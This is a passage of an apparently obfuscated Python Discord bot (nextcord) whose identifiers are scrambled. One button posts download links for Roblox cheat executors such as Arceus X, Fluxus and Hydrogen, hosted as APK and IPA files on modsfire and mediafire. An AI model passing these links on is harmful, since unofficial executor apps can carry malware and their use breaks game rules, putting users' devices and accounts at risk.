    async def send (O00O0OOO00000OO0O ,O0O000O00O0OOOOO0 :nextcord .Button ,OO00OO0OOOO0000O0 :nextcord .Interaction ):#line:892:async def send(self, button: nextcord.Button, interaction: nextcord.Interaction):
        OOOO0OOO000000000 =Embed (title ="**__SCRIPT__**",description ="# COMING SOON",color =COLOR )#line:895:color=COLOR)
        OOOO0OOO000000000 .set_image (url =Images )#line:896:embed.set_image(url=Images)
        await OO00OO0OOOO0000O0 .send (embed =OOOO0OOO000000000 ,ephemeral =True )#line:897:await interaction.send(embed=embed, ephemeral=True)
    @nextcord .ui .button (label ="Mobile Executors",style =ButtonStyle .blurple ,emoji ="<a:i7:1210538764905087046>")#line:899:@nextcord.ui.button(label="Mobile Executors", style=ButtonStyle.blurple, emoji="<a:i7:1210538764905087046>")
    async def usage (OO0OOOO0000OO0O00 ,OOOOOOOOOOOOO0O00 :nextcord .Button ,O0OOOO000O0O0O0OO :Interaction ):#line:900:async def usage(self, button: nextcord.Button, interaction: Interaction):
        OO000000OOOO0OO0O ="**Arceus X Neo 1.2.6**\n [Click here to download](https://modsfire.com/hxAKeABcKTc675A)\n\n**iOS Arceus X NEO 1.0.7**\n[Click here to download](https://www.mediafire.com/file/7831s4btzuz1hoy/Arceus_X_NEO_iOS_2.612.ipa/file)\n---\n**Fluxus 2.6.1.0** [64Bit]\n[Click here to download](https://modsfire.com/7N1jpv152A514O6)\n\n**Fluxus 2.6.1.0** [32Bit]\n[Click here to download](https://modsfire.com/d34otM0u9LxYNL0)\n\n**FluxusKeyless by PunkTeam** [64bit]\n[Click here to download](https://www.mediafire.com/file/9oef6nmbq6fw6pd/%255BPUNK_TEAM%255DFluxusKeyless%255B64bit%255D.apk/file)\n\n**FluxusKeyless by PunkTeam** [32bit]\n[Click here to download](https://www.mediafire.com/file/l1hiovj59snvpvm/%255BPUNK_TEAM%255DFluxusKeyless%255B32bit%255D.apk/file)\n---\n**Hydrogen 2.6.1.0**\n[Click here to download](https://modsfire.com/FbGMe642VT7hm5B)\n\n # ADDING COMING SOON"#line:901:instructions = "**Arceus X Neo 1.2.6**\n [Click here to download](https://modsfire.com/hxAKeABcKTc675A)\n\n**iOS Arceus X NEO 1.0.7**\n[Click here to download](https://www.mediafire.com/file/7831s4btzuz1hoy/Arceus_X_NEO_iOS_2.612.ipa/file)\n---\n**Fluxus 2.6.1.0** [64Bit]\n[Click here to download](https://modsfire.com/7N1jpv152A514O6)\n\n**Fluxus 2.6.1.0** [32Bit]\n[Click here to download](https://modsfire.com/d34otM0u9LxYNL0)\n\n**FluxusKeyless by PunkTeam** [64bit]\n[Click here to download](https://www.mediafire.com/file/9oef6nmbq6fw6pd/%255BPUNK_TEAM%255DFluxusKeyless%255B64bit%255D.apk/file)\n\n**FluxusKeyless by PunkTeam** [32bit]\n[Click here to download](https://www.mediafire.com/file/l1hiovj59snvpvm/%255BPUNK_TEAM%255DFluxusKeyless%255B32bit%255D.apk/file)\n---\n**Hydrogen 2.6.1.0**\n[Click here to download](https://modsfire.com/FbGMe642VT7hm5B)\n\n # ADDING COMING SOON"
        OO0O0OOOO0OO0O0OO =Embed (title ="**__Executors__**",description =OO000000OOOO0OO0O ,color =COLOR )#line:902:embed = Embed(title="**__Executors__**", description=instructions, color=COLOR)
        OO0O0OOOO0OO0O0OO .set_image (url =Images )#line:903:embed.set_image(url=Images)
        await O0OOOO000O0O0O0OO .send (embed =OO0O0OOOO0OO0O0OO ,ephemeral =True )#line:904:await interaction.send(embed=embed, ephemeral=True)
@bot .command (pass_context =True )#line:906:@bot.command(pass_context = True)
async def script_setup (OO0O0O0O0000OO0OO :nextcord .Interaction ):#line:907:async def script_setup(interaction: nextcord.Interaction):
    await OO0O0O0O0000OO0OO .message .delete ()#line:908:await interaction.message.delete()
    if OO0O0O0O0000OO0OO .author .name ==name :#line:909:if interaction.author.name == name:
        OOO00OO0O0O0OOO00 =nextcord .Embed (title ='**__Get script by press a button below__**',color =COLOR )#line:913:)
        OOO00OO0O0O0OOO00 .set_image (url =Images )#line:914:embed.set_image(url=Images)
        await OO0O0O0O0000OO0OO .send (embed =OOO00OO0O0O0OOO00 ,view =script ())#line:915:await interaction.send(embed=embed, view=script())
@bot .event #line:917:@bot.event
async def on_ready ():#line:918:async def on_ready():
    bot .add_view (verify ())#line:919:bot.add_view(verify())
    O0O00OO0OOOO0O0OO =nextcord .utils .get (bot .get_guild (Guild_ID ).channels ,id =Vc_ID )#line:920:vc = nextcord.utils.get(bot.get_guild(Guild_ID).channels, id=Vc_ID)
    await O0O00OO0OOOO0O0OO .guild .change_voice_state (channel =O0O00OO0OOOO0O0OO ,self_mute =False ,self_deaf =True )#line:921:await vc.guild.change_voice_state(channel=vc, self_mute=False, self_deaf=True)
    global start_time #line:922:global start_time
    start_time =date .datetime .now ()#line:923:start_time = date.datetime.now()
    clear_console ()#line:924:clear_console()
    print (f"{TerminalColors.HEADER}Bot is ready: {bot.user.name} by 4levy{TerminalColors.ENDC}")#line:925:print(f"{TerminalColors.HEADER}Bot is ready: {bot.user.name} by 4levy{TerminalColors.ENDC}")
    print (f"{TerminalColors.OKBLUE}Connected to {len(bot.guilds)} servers:{TerminalColors.ENDC}")#line:926:print(f"{TerminalColors.OKBLUE}Connected to {len(bot.guilds)} servers:{TerminalColors.ENDC}")
    for OO00O000O0000OO0O in bot .guilds :#line:927:for guild in bot.guilds:
        print (f"{TerminalColors.OKGREEN}- {OO00O000O0000OO0O.name} {TerminalColors.WARNING}(ID: {OO00O000O0000OO0O.id}){TerminalColors.ENDC}")#line:928:print(f"{TerminalColors.OKGREEN}- {guild.name} {TerminalColors.WARNING}(ID: {guild.id}){TerminalColors.ENDC}")
    O000OOO0OO00OOOO0 =sum (len (OOO00OOO0000OO0O0 .members )for OOO00OOO0000OO0O0 in bot .guilds )#line:929:total_users = sum(len(guild.members) for guild in bot.guilds)
    print (f"{TerminalColors.BOLD}Serving {O000OOO0OO00OOOO0} users{TerminalColors.ENDC}")#line:930:print(f"{TerminalColors.BOLD}Serving {total_users} users{TerminalColors.ENDC}")
    print (f"{TerminalColors.UNDERLINE}ONLINE{TerminalColors.ENDC}")#line:931:print(f"{TerminalColors.UNDERLINE}ONLINE{TerminalColors.ENDC}")
    await change_presence ()#line:933:await change_presence()
async def change_presence ():#line:935:async def change_presence():
    OO0000000OOO00OO0 =[Activity (type =ActivityType .playing ,name =STATUS1 ),Activity (type =ActivityType .listening ,name =STATUS2 ),Activity (type =ActivityType .watching ,name =STATUS3 ),Activity (type =ActivityType .watching ,name =STATUS4 )]#line:941:]
    O0000O00OO00OOO00 =[Status .online ,Status .dnd ,Status .idle ]#line:943:statuses = [Status.online, Status.dnd, Status.idle]
    for OOO0OOO0O0O0OO000 ,OOOO0OOO000O0OO0O in zip (itertools .cycle (O0000O00OO00OOO00 ),itertools .cycle (OO0000000OOO00OO0 )):#line:945:for status, activity in zip(itertools.cycle(statuses), itertools.cycle(activities)):
        await bot .change_presence (status =OOO0OOO0O0O0OO000 ,activity =OOOO0OOO000O0OO0O )#line:946:await bot.change_presence(status=status, activity=activity)
        await asyncio .sleep (TIME)#line:947:await asyncio.sleep(5)
bot .run (token )
